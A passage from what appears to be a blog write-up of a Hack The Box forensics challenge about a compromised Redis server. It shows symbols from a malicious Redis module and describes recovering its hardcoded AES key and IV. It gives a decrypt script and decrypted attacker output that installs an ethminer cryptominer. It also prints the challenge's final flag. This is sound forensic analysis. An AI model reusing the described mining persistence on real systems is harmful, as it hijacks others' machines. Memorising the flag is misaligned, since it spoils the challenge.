+[  12] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_EncryptFinal_ex
+[  13] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_EncryptInit_ex
+[  14] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   realloc
+[  15] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_CIPHER_CTX_new
+[  16] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   popen
+[  17] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   strcat
+[  18] 0x000000000000f518 0x00008  STT_OBJECT    STB_GLOBAL  STV_DEFAULT      0x10      RedisModule_CallReplyAttributeElement
+<................................................................................................................................>
+</span>	</code></pre></div></div>
+
+                <h2 id="Decompiling-ELF-Binary" class="toc-add" style="padding-top: 2.5rem;">Decompiling ELF Binary</h2>
+    <p class="head-img">Opening the binary with cutter we can confirm that its purpose is to encrypt communications with redis, within the DoCommand function we can find the key and the iv hardcoded.</p>
+    <img class="img-post" style="max-width: 995px;" src="/images/HTB/challenges/forensics/redtrails/elf_decompiled.png"/>
+
+                <h1 id="Decrypt-Script" class="toc-add" style="padding-top: 2.5rem;">Decrypt.sh</h1>
+            <p class="head-img">I wrote this simple bash script to decrypt the responses from the server</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+#!/bin/bash
+
+# Convert key and iv to hex<span class="ld">
+key=<span class="na">"</span><span class="s">$(</span><span class="gd">echo</span> <span class="na">'h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz'</span> | <span class="gd">tr</span> <span class="s">-d</span> <span class="na">'\n'</span>| <span class="gd">xxd</span> <span class="s">-p</span> | <span class="gd">xargs</span> | <span class="gd">tr</span> <span class="s">-d</span> <span class="na">'\ '</span><span class="s">)</span><span class="na">"</span>
+IV=<span class="na">"</span><span class="s">$(</span><span class="gd">echo</span> <span class="na">'YDP7ECjzuV7sagMN'</span> | <span class="gd">tr</span> <span class="s">-d</span> <span class="na">'\n'</span>| <span class="gd">xxd</span> <span class="s">-p</span> | <span class="gd">xargs</span><span class="s">)</span><span class="na">"</span>
+
+<span class="gd">echo</span> <span class="na">"</span>$1<span class="na">"</span> | <span class="gd">xxd</span> <span class="s">-r -p</span> > <span class="s">encrypted_data.bin</span>
+</span>
+# Decrypt using OpenSSL<span class="ld">
+<span class="gd">openssl</span> <span class="s">enc -aes-256-cbc -d -in encrypted_data.bin -out decrypted_data.txt -K </span><span class="na">"</span>$key<span class="na">"</span> <span class="s">-iv</span> <span class="na">"</span>$IV<span class="na">"</span> <span class="s">-nopad</span>
+
+<span class="gd">cat</span> <span class="s">./decrypted_data.txt</span>
+</span>	</code></pre></div></div>
+
+                <h1 id="Decrypting-Redis-Communications" class="toc-add" style="padding-top: 2.5rem;">Decrypting Redis Communications</h1>
+            <p class="head-img">Now we can decrypt the response from the server in tcp stream 6, and we get the final part of the flag.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> ./decrypt.sh </span><span class="k">"394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952"</span>
+
+--- Installing ethminer ---
+--- Enabling automatically startup ---
+
+
+--- Setting env ---
+ETHMINER_PATH=/tmp/ethminer
+HOSTNAME=redis-master
+REDIS_DOWNLOAD_SHA=5c76d990a1b1c5f949bcd1eed90d0c8a4f70369bdbdcb40288c561ddf88967a4
+PWD=/data
+HOME=/root
+REDIS_VERSION=7.2.1
+REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.2.1.tar.gz
+SHLVL=4
+FLAG_PART=<span class="gd">_un3xp3c73d_7r41l5!}</span>
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+
+
+--- Success! ---
+</span>	</code></pre></div></div>
+<blockquote>
+    <p>
+        _un3xp3c73d_7r41l5!}
+    </p>
+</blockquote>
+<p>Final Flag:</p>
+<blockquote>
+    <p>
+        HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}
+    </p>
+</blockquote>
+            </article>
+
+    <aside class="post-widget">
+    <nav class="post-toc-wrap fixed" id="post-toc">
+        <h4>Table of contents</h4>
+        <ol class="post-toc">
+        </ol>
+    </nav>
+    </aside>
+
+
+<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+        </div>
+    <article id="wrap">
+        <article id="lightings">
+            <section id="one">
+                <section id="two">
+                    <section id="three">
+                        <section id="four">
+                            <section id="five">
+                                
+                            </section>
+                        </section>
+                    </section>
+                </section>
+            </section>
+        </article>
+    </article>
+
+        <footer class="footer">
+        <div class="bottom">
+            <p><span>0xv01d © 2022 - 2024</span>
+            </p>
+        </div>
+    </footer> 
+        </main>
+
+        <div id="mask" class="mask"></div>
+        <a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                var gotopButton = document.getElementById("gotop");
+
+                // Show/hide the button based on scroll position
+                window.addEventListener("scroll", function () {
+                    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                        gotopButton.style.opacity = "1";
+                    } else {
+                        gotopButton.style.opacity = "0";
+                    }
+                });
+
+                // Smooth scroll to top when the button is clicked
+                gotopButton.addEventListener("click", function (event) {
+                    event.preventDefault();
+
+                    // Use the scrollIntoView method with behavior: 'smooth'
+                    document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                });
+            });
+
+        </script>
+        <script>
+            function copyToClipboard(button) {
+                // Find the nearest .highlight parent of the clicked button
+                const codeElement = button.closest('.highlight');
+
+                if (codeElement) {
+                    // Clone the code element to exclude the button
+                    const codeClone = codeElement.cloneNode(true);
+
+                    // Remove the button from the clone
+                    const buttons = codeClone.querySelectorAll('.copy-btn');
+                    buttons.forEach((btn) => btn.remove());
+
+                    const codeText = codeClone.innerText;
+
+                    // Create a temporary textarea element to copy the text
+                    const textarea = document.createElement('textarea');
+                    textarea.value = codeText;
+                    document.body.appendChild(textarea);
+
+                    // Select and copy the text
+                    textarea.select();
+                    document.execCommand('copy');
+
+                    // Remove the temporary textarea
+                    document.body.removeChild(textarea);
+
+                    // Change the icon in the button to "fa-check"
+                    const iconElement = button.querySelector('i');
+                    if (iconElement) {
+                    iconElement.classList.remove('fa-clipboard');
+                    iconElement.classList.add('fa-check', 'green-icon');
+                    }
+
+                    // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
+                    setTimeout(() => {
+                    if (iconElement) {
+                        iconElement.classList.remove('fa-check', 'green-icon');
+                        iconElement.classList.add('fa-clipboard');
+                    }
+                    }, 2000);
+                } else {
+                    console.error('Unable to find the code element');
+                }
+            }
+        </script>
+        <script>
+        document.getElementById('menu-toggle').addEventListener('click', function() {
+            var menu = document.getElementById('menu');
+            // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.toggle('hide');
+        });
+
+        document.getElementById('menu-off').addEventListener('click', function() {
+            var menu = document.getElementById('menu');
+            // Agregar la clase 'hide' para ocultar el menú
+            menu.classList.add('hide');
+        });
+        </script>
+        <script>
+            function lock() {
+                var doc = document.getElementById('doc');
+                var menu = document.getElementById('menu');
+                var mask = document.getElementById('mask');
+                var screenWidth = window.innerWidth;
+
+                if (screenWidth <= 1240) {
+                    doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+                    menu.classList.remove('hide')
+                    menu.classList.toggle('show')
+                    mask.classList.add('in')
+                } else {
+                    doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+                }
+            }
+
+            function unlock() {
+                var doc = document.getElementById('doc');
+                var menu = document.getElementById('menu');
+                var mask = document.getElementById('mask');
+                var screenWidth = window.innerWidth;
+
+                if (screenWidth <= 1240) {
+                    doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+                    menu.classList.toggle('hide')
+                    menu.classList.remove('show')
+                    mask.classList.remove('in')
+                } else {
+                    doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+                    menu.classList.add('hide')
+                    menu.classList.remove('show')
+                    mask.classList.remove('in')
+                }
+            }
+
+            // Llamar a la función al cargar la página y cuando se redimensiona la ventana
+        //    window.addEventListener('load', lock);
+        //    window.addEventListener('resize', unlock);
+
+            // Añadir el evento click al botón de menú
+            document.getElementById('menu-toggle').addEventListener('click', function() {
+                lock();  // Actualizar visibilidad del menú al hacer clic en el botón
+            });
+
+            // Añadir el evento click al botón de ocultar menú
+            document.getElementById('menu-off').addEventListener('click', function() {
+                unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+            });
+            
+            document.getElementById('mask').addEventListener('click', function() {
+                unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+            });
+        </script>
+    </body>
+</div>
+</html>
